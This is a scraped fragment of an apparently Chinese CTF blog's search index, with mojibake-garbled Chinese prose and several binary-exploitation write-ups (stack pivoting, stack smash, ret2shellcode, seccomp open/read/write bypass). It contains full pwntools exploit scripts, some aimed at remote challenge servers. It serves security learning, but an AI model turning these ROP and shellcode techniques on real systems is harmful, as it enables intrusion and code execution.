å½“ fast binã€small bin ä¸­çš„ chunk éƒ½ä¸èƒ½æ»¡è¶³ç”¨æˆ·è¯·æ±‚ chunk å¤§å°æ—¶ï¼Œå †ç®¡ç†å™¨å°±ä¼šè€ƒè™‘ä½¿ç”¨ unsorted bin ã€‚å®ƒä¼šåœ¨åˆ†é… large chunk ä¹‹å‰å¯¹å †ä¸­ç¢ç‰‡ chunk è¿›è¡Œåˆå¹¶ï¼Œä»¥ä¾¿å‡å°‘å †ä¸­çš„ç¢ç‰‡ã€‚&lt;br&gt;
unsorted bin ä¸ fast bin ä¸åŒï¼Œä»–ä½¿ç”¨åŒå‘é“¾è¡¨å¯¹ chunk è¿›è¡Œè¿æ¥&lt;/p&gt;
&lt;p&gt;unsorted çš„å­—é¢æ„æ€å°±æ˜¯â€ ä¸å¯å›æ”¶â€ çš„æ„æ€ï¼Œå¯ä»¥çœ‹ä½œå°†ä¸å¯å›æ”¶çš„åƒåœ¾ï¼ˆä¸æ»¡è¶³èƒ½å¤Ÿè¿›è¡Œå†…å­˜åˆ†é…çš„å †å—ï¼‰éƒ½æ”¾åˆ°è¿™ä¸ªâ€ åƒåœ¾æ¡¶â€ ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;large binï¼š&lt;br&gt;
å½“ fast binã€small bin ä¸­çš„ chunk éƒ½ä¸èƒ½æ»¡è¶³ç”¨æˆ·è¯·æ±‚ chunk å¤§å°æ—¶ï¼Œå°±ä¼šè€ƒè™‘æ˜¯ä¸æ˜¯ large binã€‚ä½†æ˜¯ï¼Œå…¶å®åœ¨ large bin ä¸­å¹¶æ²¡æœ‰ç›´æ¥å»æ‰«æå¯¹åº” bin ä¸­çš„ chunkï¼Œè€Œæ˜¯å…ˆåˆ©ç”¨ malloc_consolidateï¼ˆå‚è§ malloc_state ç›¸å…³å‡½æ•°ï¼‰ å‡½æ•°å¤„ç† fast bin ä¸­çš„ chunkï¼Œå°†æœ‰å¯èƒ½èƒ½å¤Ÿåˆå¹¶çš„ chunk å…ˆè¿›è¡Œåˆå¹¶åæ”¾åˆ° unsorted bin ä¸­ï¼Œä¸èƒ½å¤Ÿåˆå¹¶çš„å°±ç›´æ¥æ”¾åˆ° unsorted bin ä¸­ï¼Œç„¶ååœ¨å¤§å¾ªç¯ä¸­è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚&lt;/p&gt;
">glibc mallocæœºåˆ¶ç•¥è¯»</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JI_Le20ep/"" data-c="
          &lt;p&gt;åšäº†è¿™é“é¢˜æ‰ç®—æ˜¯ç†è§£æ ˆè¿ç§»äº†ï¼Œä¹‹å‰é‚£é“æ ˆè¿ç§»æ²¡ææ‡‚åŸç†å°±äº¤å·®äº†ï¼ˆğŸ˜“&lt;br&gt;
æ­¤é¢˜64ä½ï¼Œä¿æŠ¤ä»…å¼€å¯nxï¼Œstringsé‡Œé¢æ²¡æœ‰&lt;code&gt;system&lt;/code&gt;æˆ–&lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œè€ƒè™‘æ³„éœ²libcåŸºå€&lt;br&gt;
æœ¬é¢˜æœ‰ä¸¤æ¬¡è¾“å…¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918066895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918157930.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡è¾“å…¥å†™å…¥bssæ®µä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€èµ·å§‹ä¸º0x404080&lt;br&gt;
ç¬¬äºŒæ¬¡è¾“å…¥bufï¼Œè·ç¦»rbpä¸º&lt;code&gt;0x20&lt;/code&gt;ï¼Œä½†æ˜¯é™åˆ¶è¾“å…¥é•¿åº¦ä¸º&lt;code&gt;0x30&lt;/code&gt;ï¼Œåˆ™æº¢å‡ºé•¿åº¦ä»…æœ‰&lt;code&gt;0x8&lt;/code&gt;å­—èŠ‚é•¿ï¼Œæ­£å¸¸çš„ropé“¾è‚¯å®šè¡Œä¸é€šï¼Œäºæ˜¯è€ƒè™‘æ ˆè¿ç§»&lt;br&gt;
æ ˆè¿ç§»æœ¬è´¨æ˜¯åˆ©ç”¨ä¸¤æ¬¡&lt;code&gt;leave&lt;/code&gt;(å°†å‡½æ•°ç»“æŸåçš„&lt;code&gt;ret_addr&lt;/code&gt;è¦†ç›–ä¸º&lt;code&gt;leave_ret_addr&lt;/code&gt;å³å¯ï¼ŒåŠ«æŒrspå¯„å­˜å™¨ï¼Œä»¥åŠä¸€æ¬¡&lt;code&gt;ret&lt;/code&gt;è¾¾åˆ°åˆ©ç”¨çš„ç›®çš„ï¼›ä¸‹é¢æ˜¯æ ˆè¿ç§»çš„å¤§è‡´æ‰‹ç»˜æ€è·¯ï¼ˆæ ˆåœ°å€é‚£å—åº”ä¸º&lt;code&gt;old_rbp&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918532328.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡è¾“å…¥å¯ä»¥å¸ƒç½®ROPé“¾ï¼Œç¬¬äºŒæ¬¡è¾“å…¥è¿›è¡Œæ ˆè¿ç§»&lt;br&gt;
é€‰æ‹©åœ¨&lt;code&gt;bss_addr+0x60&lt;/code&gt;å¤„è¿›è¡Œå¸ƒç½®ï¼Œå¯ä»¥é¿å…è®¿é—®ä¿®æ”¹äº†ä¸bssæ®µç›¸é‚»çš„gotè¡¨ï¼Œä½†ç¬¬ä¸€æ¬¡è¾“å…¥æ˜¯åœ¨&lt;code&gt;bss_addr&lt;/code&gt;å¤„å¼€å§‹ï¼Œåˆ™æˆ‘ä»¬éœ€è¦&lt;code&gt;0x60&lt;/code&gt;çš„paddingå¡«å……&lt;br&gt;
æ­¤é¢˜åªéœ€è¿ç§»1æ¬¡æ ˆï¼Œåˆ™è¿ç§»åä¼ªæ ˆçš„å¸ƒç½®çš„&lt;code&gt;fake_addr&lt;/code&gt;å¯ä¸ºä»»æ„å€¼ï¼ˆå¦‚0xdeadbeef&lt;br&gt;
æ­¤åå¼€å§‹ROPé“¾å¸ƒç½®ï¼Œç¬¬ä¸€æ¬¡å…ˆæ³„éœ²å‡ºlibcåŸºå€ï¼Œç„¶åè¿”å›ç¬¬äºŒæ¬¡æº¢å‡ºçš„readå¤„ï¼Œå³&lt;code&gt;vuln()&lt;/code&gt;å¤„ï¼›&lt;br&gt;
å¦å¤–ï¼Œæ­¤é¢˜æº¢å‡ºé•¿åº¦è¾ƒçŸ­ï¼Œæ— æ³•ä¼ å‚è°ƒç”¨&lt;code&gt;system(/bin/sh)&lt;/code&gt;ï¼Œåªèƒ½ä½¿ç”¨one_gadget&lt;br&gt;
è¿˜éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œæœ€åreadçš„paddingä¸º&lt;code&gt;0x27&lt;/code&gt;è€Œä¸æ˜¯&lt;code&gt;0x28&lt;/code&gt;åœ¨äºæœ«å°¾ä¼šå¤šå‡ºä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¦‚æœ&lt;code&gt;0x28&lt;/code&gt;åˆ™ä¼šå¯¼è‡´æœ€åretåœ°å€å¤šå‡º1ä¸ªå­—èŠ‚å†…å®¹,å¦‚å›¾&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677919344060.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­£å¸¸æƒ…å†µä¸‹å¯ä»¥getshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677919357036.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./yichu2&amp;quot;)
elf=ELF(&amp;quot;./yichu2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
start=elf.sym[b&amp;quot;main&amp;quot;]

vuln=0x401227
pop_rdi_ret=0x4012a3
leave_ret=0x4011e0
bss_addr=0x404080 #0x404080
payload1=cyclic(0x60)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
# payload1=p64(one_gadget)

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
io.sendline(payload1)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;ffer:\n&amp;quot;)
payload2=cyclic(0x20)+p64(bss_addr+0x60)+p64(leave_ret)
io.sendline(payload2)


base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;] 
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))
one_gadget=0x4f322+base_addr
print(&amp;quot;one_gadget:  &amp;quot;+hex(one_gadget))
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
# print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))

payload2=cyclic(0x27)+p64(one_gadget)
io.sendline(payload2)

io.interactive()




# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012a0 : pop r14 ; pop r15 ; ret
# 0x00000000004012a2 : pop r15 ; ret
# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012a3 : pop rdi ; ret
# 0x00000000004012a1 : pop rsi ; pop r15 ; ret
# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">yichu2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/64O650yoM/"" data-c="
          &lt;p&gt;ç¬¬äºŒé“64ä½stack smashé¢˜ç›®ï¼Œä¸ä¸Šä¸€é“æ¯”è¾ƒæ²¡æœ‰å¼€å¯pieä¿æŠ¤&lt;br&gt;
ä¸»å‡½æ•°ç›´æ¥å°†è¯¥é¢˜æœ¬ä½“æ”¾å‡ºæ¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482258983.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¯»å…¥flagåˆ°&lt;code&gt;&amp;amp;buf&lt;/code&gt;å¤„ï¼Œgets()æ ˆæº¢å‡ºè¦†ç›–åˆ°&lt;code&gt;__libc_argv[0]&lt;/code&gt;&lt;br&gt;
æ­¤é¢˜offsetæœ¬åœ°æµ‹å‡ºæ¥åˆæ¯”å¹³å°å¤š0x10ï¼Œæ˜¯ä¸ªé—®é¢˜ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶å®ƒé—®é¢˜ï¼Œneeded&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482413009.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ•…expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./smash&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28537)
flag_addr=0x404060
payload=cyclic(0x1f8)+p64(flag_addr)
io.recvuntil(b&amp;quot;Luck.\n&amp;quot;)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK3]smash wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/CXTYzf2Lz/"" data-c="
          &lt;p&gt;*æ­¤é¢˜æœªå®é™…ç”¨åˆ°rbpå¯„å­˜å™¨ï¼ŒçŒœæµ‹æ˜¯rspå¯»å€&lt;br&gt;
64ä½stack smashé¢˜ç›®,ä¿æŠ¤å…¨å¼€ï¼Œä¸»å‡½æ•°ä¸­å­˜åœ¨gets()å¯ä»¥æ ˆæº¢å‡º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479101722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œæœ¬é¢˜å­˜åœ¨&lt;code&gt;__stack_chk_fail&lt;/code&gt;ï¼Œå¹¶ä¸”&lt;code&gt;sub_CF0&lt;/code&gt;å‡½æ•°å¯ä»¥å°†flagè¯»å…¥åˆ°åç§»ä¸º0x202040å¤„ï¼Œæ„å‘³ç€å¯ä»¥åˆ©ç”¨stack smashæ³„éœ²å‡ºflag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479354508.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åˆ™æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ³„éœ²ç¨‹åºåŸºåœ°å€ä»è€Œè·å–flag_addr,å†é€šè¿‡stack smashå°†flagæ‰“å°å‡ºæ¥&lt;br&gt;
æ­¤æ—¶ç¬¬ä¸€æ¬¡è¾“å…¥é™åˆ¶é•¿åº¦ä¸º16 bytesï¼Œå¯ä»¥è¾“å…¥æ³„éœ²å‡½æ•°å†…å­˜åœ°å€åœ¨å‡å»é«˜ä½åç§»è·å–ç¨‹åºåŸºå€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479564976.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶åè¾“å…¥backdoorå°†flagè¯»å…¥&lt;br&gt;
æ¥ä¸‹æ¥å®šä½&lt;code&gt;__libc_argv[0]&lt;/code&gt;æ‰€åœ¨ä½ç½®ï¼Œå®ƒä½œä¸ºæŒ‡é’ˆæŒ‡å‘å†…å­˜åœ°å€å¯ä»¥ä½œä¸ºæˆ‘ä»¬stack smashåˆ©ç”¨çš„å…³é”®ï¼Œå†é€šè¿‡å‘ç”Ÿæº¢å‡ºçš„ä½ç½®ä¸å®ƒçš„åç§»ç¡®å®šåƒåœ¾æ•°æ®é•¿åº¦ï¼Œä½†æ˜¯æ­¤é¢˜gdbåŠ¨æ€è°ƒè¯•æ—¶ç¡®å®šæº¢å‡ºç‚¹æ—¶å‘ç°&lt;code&gt;$rbp-0x88&lt;/code&gt;åœ°å€åäº†åä¸‡å…«åƒé‡Œï¼Œéœ€è¦é€šè¿‡&lt;code&gt;$rsp+0x20&lt;/code&gt;æ¥è·å–æº¢å‡ºç‚¹åœ°å€ï¼ŒçŒœæµ‹æ­¤é¢˜å¯èƒ½æ˜¯rspå¯»å€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479962101.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸è¿‡æ­¤é¢˜æœ¬åœ°è°ƒè¯•æµ‹å‡ºæ¥offsetæ˜¯0x178ï¼Œä¸è¿œç«¯0x168ä¸ç¬¦ï¼ŒåŸå› æš‚æ—¶è¿˜æ²¡ææ‡‚ğŸ˜¿&lt;br&gt;
å¦å¤–æ­¤é¢˜åªæœ‰å†æ¬¡è¾“å…¥&#39;exitexit&#39;æ‰èƒ½ç»“æŸå¾ªç¯&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677480094183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import*
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easyecho&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28981)

io.recvuntil(b&amp;quot;: &amp;quot;)
payload=b&amp;quot;a&amp;quot;*15+b&amp;quot;b&amp;quot;
io.sendline(payload)
io.recvuntil(b&amp;quot;b&amp;quot;)

base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xcf0
print(&amp;quot;base_addr  &amp;quot;+hex(base_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;backdoor&amp;quot;)

flag_addr=base_addr+0x202040
payload=cyclic(0x168)+p64(flag_addr)
io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(payload)

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;exitexit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[2021 é¹¤åŸæ¯]easyecho wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/-Mc1qDHO8/"" data-c="
          &lt;p&gt;3/4ï¼Œæœ‰ä¸€é“è¿æ°”å¥½æš´åŠ›è„šæœ¬å‡ºæ¥çš„ï¼Œæœ€åä¸€é¢˜rusté€†å‘...&lt;br&gt;
&lt;strong&gt;myexec&lt;/strong&gt;&lt;br&gt;
mmapå¼€è¾Ÿäº†ä¸€å—å¯å†™åŒºé—´ï¼Œreadå‡½æ•°å†™å…¥è¯¥åŒºé—´&lt;br&gt;
ç›´æ¥shellcodeå‘é€shellcraft.sh()å°±è¡Œäº†&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28003)

shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;mymem&lt;/strong&gt;&lt;br&gt;
å‡½æ•°ä¸»ä½“å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä¸è¿‡æ­¤é¢˜seccomp-tools dumpå‡ºæ¥å‘ç°é™åˆ¶äº†&lt;code&gt;sys_number&lt;/code&gt;&lt;br&gt;
ä¸è¿‡å¯ä»¥æ„é€ &lt;code&gt;open(&amp;quot;&amp;quot;)+read(&amp;quot;&amp;quot;)+write()&lt;/code&gt;çš„å‡½æ•°è°ƒç”¨æ¥ç»•è¿‡&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./mymem&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28391)
tp_addr=0x50000


shellcode=asm(shellcraft.open(&amp;quot;/home/ctf/flag.txt&amp;quot;))+asm(shellcraft.read(3,tp_addr,50))+asm(shellcraft.write(1,tp_addr,50))
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;oldfashion&lt;/strong&gt;&lt;br&gt;
&lt;s&gt;éé¢„æœŸäº†&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)


# io=process(&amp;quot;./zzzzz&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28524)
while 1:
    io.sendline(b&amp;quot;2&amp;quot;)
    if io.recv()==(b&amp;quot;Congratulations! You guessed the number correctly.\n&amp;quot;):
        break

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#9 Basic. éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/06adMi_L5/"" data-c="
          &lt;p&gt;å‚è€ƒ&lt;a href=&#34;https://blog.csdn.net/K1ose/article/details/116035405?spm=1001.2101.3001.6650.3&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;utm_relevant_index=3&#34;&gt;åšå®¢é“¾æ¥&lt;/a&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡åšorwæ²™ç›’ç±»é¢˜ç›®ï¼Œæ­¤ç±»é¢˜ç›®ä¸€èˆ¬æ˜¯ç¦ç”¨ç³»ç»Ÿè°ƒç”¨&lt;br&gt;
ä½¿ç”¨&lt;code&gt;$seccomp-tools dump ./orw&lt;/code&gt;æŸ¥çœ‹è°ƒç”¨ï¼Œå‘ç°å¼€å¯open,write,readç­‰ç­‰å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›å‡½æ•°è¯»å–flagå¹¶æ‰“å°å‡ºæ¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216184304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œä¸»å‡½æ•°åˆ™æç¤ºshellcodeï¼Œå¯ä»¥åˆ©ç”¨shellcodeè°ƒç”¨è¿™ä¸‰ä¸ªå‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216378453.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
äºæ˜¯expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./orw&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29507)

bss_addr=0x804A040
io.recvuntil(b&amp;quot;shellcode:&amp;quot;)

payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;))+asm(shellcraft.read(3,bss_addr,0x40))+asm(shellcraft.write(1,bss_addr,0x40))   
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æ‰“é€š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216548065.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable_orw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zkKMLDz8g/"" data-c="
          &lt;p&gt;32ä½&lt;br&gt;
ç¬¬ä¸€æ¬¡å‘bssæ®µå†™å…¥&lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œç¬¬äºŒæ¬¡æº¢å‡ºååˆ©ç”¨32ä½ä¼ å‚è°ƒç”¨&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;br&gt;
æ³¨æ„æ­¤å¤„è°ƒç”¨çš„æ˜¯ä»£ç æ®µä¸­çš„systemå‡½æ•°ï¼Œä¸æ˜¯&lt;code&gt;call _system&lt;/code&gt;,åè€…ä¼ å‚ç›´æ¥ä¼ &lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œä¸éœ€è¦padding&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./ezr0p&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28351)
elf=ELF(&amp;quot;./ezr0p&amp;quot;)
# io=remote(&amp;quot;&amp;quot;,)

sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
bss_addr=0x804A080


io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh&amp;quot;
io.send(payload)

io.recvuntil(&amp;quot;time~\n&amp;quot;)
payload=cyclic(0x1c+0x4)+p32(sys_addr)+p32(0)+p32(bss_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x080484d7 : mov al, byte ptr [0xc9010804] ; ret
# 0x08048381 : mov ebx, 0x81000000 ; ret
# 0x08048440 : mov ebx, dword ptr [esp] ; ret
# 0x0804864b : pop ebp ; ret
# 0x08048648 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x0804864a : pop edi ; pop ebp ; ret
# 0x08048649 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048386 : ret
# 0x0804848e : ret 0xeac1

# Unique gadgets found: 10
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ezr0p32 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8VhmkjUgk/"" data-c="
          &lt;p&gt;æ­¤é¢˜ä¸º64ä½ret2shellcodeæ¨¡æ¿é¢˜ï¼Œç¬¬ä¸€æ¬¡å°è¯•shellcodeç±»å‹é¢˜ç›®&lt;br&gt;
ret2shellcodeç±»å‹é¢˜ç›®ä¸€èˆ¬æ˜¯å°†shellcodeå†™åˆ°å¯æ‰§è¡Œæ®µï¼Œç„¶åé€šè¿‡retè¿”å›åœ°å€åˆ°å†™å…¥çš„å¯æ‰§è¡Œæ®µçš„åœ°å€æ‰§è¡Œshellcodeè·å–shell&lt;br&gt;
é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤ï¼Œnxå¼€å¯ï¼Œpieå…³é—­ï¼Œä½†æ˜¯è‡ªå¸¦çš„&lt;code&gt;mprotect&lt;/code&gt;å‡½æ•°å¯ä»¥ä¿®æ”¹ç¨‹åºå†…å­˜æƒé™&lt;br&gt;
è¯¦è§&lt;a href=&#34;https://www.yulate.com/82.html&#34;&gt;é“¾æ¥&lt;/a&gt;,å…ˆæŒ–ä¸ªå‘ï¼Œè¿˜æ²¡å­¦åˆ°å †&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876579446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤é¢˜idaåç¼–è¯‘åå¯è§å°†è¯»å…¥çš„å­—ç¬¦ä¸²å†™å…¥buffï¼Œå³bssæ®µ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876749276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876755646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åˆ™å¯ä»¥è€ƒè™‘å†™shellcodeå†åŠ ä¸Šåƒåœ¾å­—ç¬¦å¡«å……è¾¾åˆ°æº¢å‡ºé•¿åº¦è¦†ç›–rbpï¼Œå†é€šè¿‡è¿”å›bssåœ°å€æ‰§è¡Œ&lt;br&gt;
expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ret2shellcode&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28076)

bss_addr=0x4040a0
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(bss_addr)
io.send(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ret2shellcode wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/friends/"" data-c="
          &lt;p&gt;glan: &lt;a href=&#34;https://g1an123.github.io/&#34;&gt;https://g1an123.github.io/&lt;/a&gt;&lt;br&gt;
